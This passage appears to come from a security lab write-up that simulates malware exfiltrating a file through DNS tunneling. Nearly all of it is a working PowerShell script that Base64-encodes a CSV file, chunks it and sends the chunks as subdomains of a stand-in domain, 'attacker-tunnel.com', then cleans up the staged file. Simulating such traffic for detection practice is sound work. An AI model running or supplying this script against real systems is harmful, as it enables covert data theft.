Attack Execution
To simulate a malware generating DNS tunneling/exfiltration traffic, I encoded a file into BASE64, then split it into smaller chunks and then performed a DNS lookup where the encoded data will be passed to the attacker as a subdomain along with its chunk's position.
$SourcePath = "$env:USERPROFILE\Documents\Data\Datasets\Lauren Furniture Store Transactions.csv"
$TempStaging = "$env:TEMP\staged_data.tmp"
$TargetDNS = "172.16.0.1"
$FakeDomain = "attacker-tunnel.com" Write-Host "[+] Staging entire file..."
if (Test-Path $SourcePath) { # Copies the complete file to the temp directory Copy-Item -Path $SourcePath -Destination $TempStaging -Force
} else { "TransactionID,Customer,Amount`n1001,DemoUser,250.00" | Out-File -FilePath $TempStaging -Encoding utf8
} Write-Host "[+] Preparing 45-character Base64 chunks..."
$RawBytes = [System.IO.File]::ReadAllBytes($TempStaging)
$Base64Data = [Convert]::ToBase64String($RawBytes) $ChunkSize = 45
$Chunks = [regex]::Matches($Base64Data, ".{1,$ChunkSize}") | ForEach-Object { $_.Value } Write-Host "[+] Transmitting $($Chunks.Count) chunks via DNS NULL queries... (This will take about a minute)"
$Counter = 1
foreach ($Chunk in $Chunks) { # Sanitize the Base64 string for valid DNS characters $SafeChunk = $Chunk -replace '\+', '-' -replace '/', '_' -replace '=', '' # FORMAT: [45-Char-Base64].seq[Counter].attacker-tunnel.com $QueryFQDN = "$SafeChunk.seq$Counter.$FakeDomain" Resolve-DnsName -Name $QueryFQDN -Type NULL -Server $TargetDNS -QuickTimeout -ErrorAction SilentlyContinue | Out-Null $Counter++ Start-Sleep -Milliseconds 100
} if (Test-Path $TempStaging) { Remove-Item -Path $TempStaging -Force }
Write-Host "`n[✓] Full file exfiltration complete! Artifacts cleaned up." Generated Logs
